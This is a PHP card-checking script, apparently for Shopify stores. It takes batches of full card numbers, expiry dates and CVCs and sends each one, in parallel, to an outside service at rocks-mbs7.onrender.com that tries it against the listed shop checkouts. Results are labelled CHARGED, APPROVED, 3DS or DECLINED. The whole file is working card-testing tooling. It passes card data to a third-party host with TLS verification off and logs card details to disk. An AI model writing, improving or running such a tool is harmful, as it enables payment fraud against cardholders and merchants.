<?php
header('Content-Type: text/plain');

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// File-based logging for debugging (disable in production)
$log_file = __DIR__ . '/autoshopify_debug.log';
function log_message($message) {
    global $log_file;
    // Mask card numbers in logs
    $message = preg_replace('/(\d{6})\d+(\d{4})/', '$1****$2', $message);
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to validate a site URL
function validateSite($site) {
    // Normalize site URL
    if (!preg_match('/^https?:\/\//i', $site)) {
        $site = 'https://' . $site;
    }
    // Basic URL validation
    if (!preg_match('/^(https?:\/\/)?([\w-]+\.)+[\w-]{2,}(\/.*)?$/', $site)) {
        return false;
    }
    return $site;
}

// Function to check a single card on one site, moving to the next site only on error responses
function checkCard($card_number, $exp_month, $exp_year, $cvc, $sites, $retry = 1) {
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    $error_responses = [
        'clinte token', 'product id is empty', 'del amount empty', 'py id empty', 'r4 token empty', 'tax amount empty'
    ];

    foreach ($sites as $site) {
        // Validate and normalize site
        $site = validateSite($site);
        if ($site === false) {
            log_message("Invalid site URL for $card_details: $site");
            continue; // Skip invalid site
        }

        $encoded_cc = urlencode($card_details);
        $api_url = "https://rocks-mbs7.onrender.com/index.php?site=" . urlencode($site) . "&cc=$encoded_cc";
        log_message("Checking card: $card_details on site: $site, URL: $api_url");

        for ($attempt = 0; $attempt <= $retry; $attempt++) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $api_url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 50); // 50-second timeout
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production

            $response = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curl_error = curl_error($ch);
            $curl_errno = curl_errno($ch);
            curl_close($ch);

            log_message("Attempt " . ($attempt + 1) . " for $card_details on $site: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response ?: 'No response', 0, 100));

            // Handle API errors
            if ($response === false || $http_code !== 200 || !empty($curl_error)) {
                if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry) {
                    log_message("Timeout for $card_details on $site, retrying...");
                    usleep(500000); // 0.5s delay before retry
                    continue;
                }
                log_message("Failed for $card_details on $site: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
                break; // Move to next site
            }

            // Parse JSON response
            $result = json_decode($response, true);
            if (json_last_error() !== JSON_ERROR_NONE || !isset($result['Response'], $result['Status'], $result['Gateway'], $result['Price'])) {
                log_message("Invalid JSON for $card_details on $site: " . substr($response, 0, 100));
                break; // Move to next site
            }

            $response_text = trim($result['Response']);
            $gateway = htmlspecialchars($result['Gateway'], ENT_QUOTES, 'UTF-8');
            $price = htmlspecialchars($result['Price'], ENT_QUOTES, 'UTF-8');

            // Check if it's an error response to move to next site
            $is_error = false;
            foreach ($error_responses as $err) {
                if (stripos($response_text, $err) !== false) {
                    $is_error = true;
                    break;
                }
            }
            if ($is_error) {
                log_message("Error response for $card_details on $site: $response_text, moving to next site");
                break; // Move to next site
            }

            // Map response to status
            $mapped_status = 'DECLINED';
            if (in_array($response_text, ['Thank You', 'ORDER_PLACED'], true)) {
                $mapped_status = 'CHARGED';
            } elseif (in_array($response_text, ['INCORRECT_ZIP', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS'], true)) {
                $mapped_status = 'APPROVED';
            } elseif ($response_text === '3D_AUTHENTICATION') {
                $mapped_status = '3DS';
            } elseif (in_array($response_text, [
                'CARD_DECLINED', 'FRAUD_SUSPECTED', 'INCORRECT_NUMBER', 'INVALID_PAYMENT_ERROR',
                'AUTHORIZATION_ERROR', 'PROCESSING_ERROR', 'EXPIRED_CARD'
            ], true)) {
                $mapped_status = 'DECLINED';
            }

            $response_msg = htmlspecialchars($response_text, ENT_QUOTES, 'UTF-8');
            log_message("$mapped_status for $card_details on $site: $response_msg (Gateway: $gateway, Price: $price)");
            return "$mapped_status [$response_msg] (Gateway: $gateway, Price: $price) $card_details";
        }
    }

    log_message("Failed after all sites for $card_details");
    return "DECLINED [All sites failed or errored] $card_details";
}

// Function to process cards in parallel with up to 3 concurrent API requests
function processCardsInParallel($cards, $sites, $max_concurrent = 3) {
    $results = [];
    $mh = curl_multi_init();
    $active_requests = [];
    $site_indices = array_fill(0, count($cards), 0); // Track current site for each card
    $card_queue = array_map(function($index, $card) {
        return ['index' => $index, 'card' => $card];
    }, array_keys($cards), $cards);
    $error_responses = [
        'clinte token', 'product id is empty', 'del amount empty', 'py id empty', 'r4 token empty', 'tax amount empty'
    ];

    while (!empty($card_queue) || !empty($active_requests)) {
        // Add new requests up to max_concurrent
        while (count($active_requests) < $max_concurrent && !empty($card_queue)) {
            $task = array_shift($card_queue);
            $index = $task['index'];
            $card = $task['card'];
            $site_index = $site_indices[$index];

            if ($site_index >= count($sites)) {
                // No more sites to try
                $results[$index] = "DECLINED [All sites failed or errored] {$card['number']}|{$card['exp_month']}|{$card['exp_year']}|{$card['cvc']}";
                log_message("No more sites for card index $index: {$results[$index]}");
                continue;
            }

            $site = $sites[$site_index];
            $site = validateSite($site);
            if ($site === false) {
                log_message("Invalid site URL for card index $index: {$sites[$site_index]}, moving to next site");
                $site_indices[$index]++;
                $card_queue[] = ['index' => $index, 'card' => $cards[$index]];
                continue;
            }

            $card_details = "{$card['number']}|{$card['exp_month']}|{$card['exp_year']}|{$card['cvc']}";
            $api_url = "https://rocks-mbs7.onrender.com/index.php?site=" . urlencode($site) . "&cc=" . urlencode($card_details);
            log_message("Queueing request for card index $index: $card_details on site: $site");

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $api_url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 50);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production
            curl_multi_add_handle($mh, $ch);
            $active_requests[] = [
                'handle' => $ch,
                'card_index' => $index,
                'site_index' => $site_index,
                'card_details' => $card_details,
                'site' => $site,
                'retry' => 0,
                'max_retry' => 1
            ];
        }

        // Execute active requests
        do {
            $status = curl_multi_exec($mh, $running);
            curl_multi_select($mh);
        } while ($running > 0 && $status == CURLM_CALL_MULTI_PERFORM);

        // Process completed requests
        foreach ($active_requests as $key => $request) {
            $ch = $request['handle'];
            $info = curl_getinfo($ch);
            $response = curl_multi_getcontent($ch);
            $http_code = $info['http_code'];
            $curl_error = curl_error($ch);
            $curl_errno = curl_errno($ch);
            $card_index = $request['card_index'];
            $site_index = $request['site_index'];
            $card_details = $request['card_details'];
            $site = $request['site'];
            $retry = $request['retry'];
            $max_retry = $request['max_retry'];

            if ($response !== null || $curl_error || $http_code) {
                log_message("Completed request for card index $card_index: $card_details on $site, HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response ?: 'No response', 0, 100));

                // Handle API errors
                if ($response === false || $http_code !== 200 || !empty($curl_error)) {
                    if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $retry < $max_retry) {
                        log_message("Timeout for $card_details on $site, retrying...");
                        $active_requests[$key]['retry']++;
                        $new_ch = curl_init();
                        curl_setopt_array($new_ch, curl_get_info($ch, CURLINFO_PRIVATE));
                        curl_multi_add_handle($mh, $new_ch);
                        $active_requests[$key]['handle'] = $new_ch;
                        continue;
                    }
                    log_message("Failed for $card_details on $site: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
                    // Move to next site
                    $site_indices[$card_index]++;
                    $card_queue[] = ['index' => $card_index, 'card' => $cards[$card_index]];
                    curl_multi_remove_handle($mh, $ch);
                    curl_close($ch);
                    unset($active_requests[$key]);
                    continue;
                }

                // Parse JSON response
                $result = json_decode($response, true);
                if (json_last_error() !== JSON_ERROR_NONE || !isset($result['Response'], $result['Status'], $result['Gateway'], $result['Price'])) {
                    log_message("Invalid JSON for $card_details on $site: " . substr($response, 0, 100));
                    // Move to next site
                    $site_indices[$card_index]++;
                    $card_queue[] = ['index' => $card_index, 'card' => $cards[$card_index]];
                    curl_multi_remove_handle($mh, $ch);
                    curl_close($ch);
                    unset($active_requests[$key]);
                    continue;
                }

                $response_text = trim($result['Response']);
                $gateway = htmlspecialchars($result['Gateway'], ENT_QUOTES, 'UTF-8');
                $price = htmlspecialchars($result['Price'], ENT_QUOTES, 'UTF-8');

                // Check if it's an error response to move to next site
                $is_error = false;
                foreach ($error_responses as $err) {
                    if (stripos($response_text, $err) !== false) {
                        $is_error = true;
                        break;
                    }
                }
                if ($is_error) {
                    log_message("Error response for $card_details on $site: $response_text, moving to next site");
                    $site_indices[$card_index]++;
                    $card_queue[] = ['index' => $card_index, 'card' => $cards[$card_index]];
                    curl_multi_remove_handle($mh, $ch);
                    curl_close($ch);
                    unset($active_requests[$key]);
                    continue;
                }

                // Map response to status
                $mapped_status = 'DECLINED';
                if (in_array($response_text, ['Thank You', 'ORDER_PLACED'], true)) {
                    $mapped_status = 'CHARGED';
                } elseif (in_array($response_text, ['INCORRECT_ZIP', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS'], true)) {
                    $mapped_status = 'APPROVED';
                } elseif ($response_text === '3D_AUTHENTICATION') {
                    $mapped_status = '3DS';
                } elseif (in_array($response_text, [
                    'CARD_DECLINED', 'FRAUD_SUSPECTED', 'INCORRECT_NUMBER', 'INVALID_PAYMENT_ERROR',
                    'AUTHORIZATION_ERROR', 'PROCESSING_ERROR', 'EXPIRED_CARD'
                ], true)) {
                    $mapped_status = 'DECLINED';
                }

                $response_msg = htmlspecialchars($response_text, ENT_QUOTES, 'UTF-8');
                $results[$card_index] = "$mapped_status [$response_msg] (Gateway: $gateway, Price: $price) $card_details";
                log_message("Result for card index $card_index: $results[$card_index]");
                curl_multi_remove_handle($mh, $ch);
                curl_close($ch);
                unset($active_requests[$key]);
            }
        }

        // Small delay to prevent tight loop
        usleep(10000); // 10ms
    }

    curl_multi_close($mh);
    ksort($results);
    return $results;
}

// Check if the request is POST and contains cards and sites data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['cards']) || !is_array($_POST['cards']) || !isset($_POST['sites']) || !is_array($_POST['sites'])) {
    log_message("Invalid request or missing cards/sites data");
    echo "ERROR [Invalid request or missing cards/sites data]";
    exit;
}

$cards = $_POST['cards'];
$sites = $_POST['sites'];
$required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];
$processed_cards = [];

// Validate and normalize sites
$valid_sites = [];
foreach ($sites as $index => $site) {
    $normalized_site = validateSite($site);
    if ($normalized_site !== false) {
        $valid_sites[] = $normalized_site;
    } else {
        log_message("Invalid site at index $index: $site");
    }
}
if (empty($valid_sites)) {
    log_message("No valid sites provided");
    echo "ERROR [No valid sites provided]";
    exit;
}

// Validate and normalize each card
foreach ($cards as $index => $card) {
    // Validate card data
    foreach ($required_fields as $field) {
        if (empty($card[$field])) {
            log_message("Missing $field for card index $index");
            echo "DECLINED [Missing $field]\n";
            continue 2;
        }
    }

    // Sanitize inputs
    $card_number = preg_replace('/[^0-9]/', '', $card['number']);
    $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
    $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
    $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

    // Normalize exp_month to 2 digits
    $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
    if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
        log_message("Invalid exp_month format for card index $index: $exp_month_raw");
        echo "DECLINED [Invalid exp_month format]\n";
        continue;
    }

    // Normalize exp_year to 4 digits
    if (strlen($exp_year_raw) == 2) {
        $current_year = (int) date('y');
        $current_century = (int) (date('Y') - $current_year);
        $card_year = (int) $exp_year_raw;
        $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
    } elseif (strlen($exp_year_raw) == 4) {
        $exp_year = (int) $exp_year_raw;
    } else {
        log_message("Invalid exp_year format for card index $index: $exp_year_raw");
        echo "DECLINED [Invalid exp_year format - must be YY or YYYY]\n";
        continue;
    }

    // Validate card number, year, and CVC
    if (!preg_match('/^\d{13,19}$/', $card_number)) {
        log_message("Invalid card number format for card index $index: $card_number");
        echo "DECLINED [Invalid card number format]\n";
        continue;
    }
    if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
        log_message("Invalid exp_year after normalization for card index $index: $exp_year");
        echo "DECLINED [Invalid exp_year format or too far in future]\n";
        continue;
    }
    if (!preg_match('/^\d{3,4}$/', $cvc)) {
        log_message("Invalid CVC format for card index $index: $cvc");
        echo "DECLINED [Invalid CVC format]\n";
        continue;
    }

    // Validate logical expiry
    $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
    $current_timestamp = strtotime('first day of this month');
    if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
        log_message("Card expired for card index $index: $card_number|$exp_month|$exp_year|$cvc");
        echo "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc\n";
        continue;
    }

    $processed_cards[] = [
        'number' => $card_number,
        'exp_month' => $exp_month,
        'exp_year' => $exp_year,
        'cvc' => $cvc
    ];
}

// Process cards in parallel with up to 3 concurrent requests
$results = processCardsInParallel($processed_cards, $valid_sites, 3);

// Output results
foreach ($results as $result) {
    echo "$result\n";
}
?>
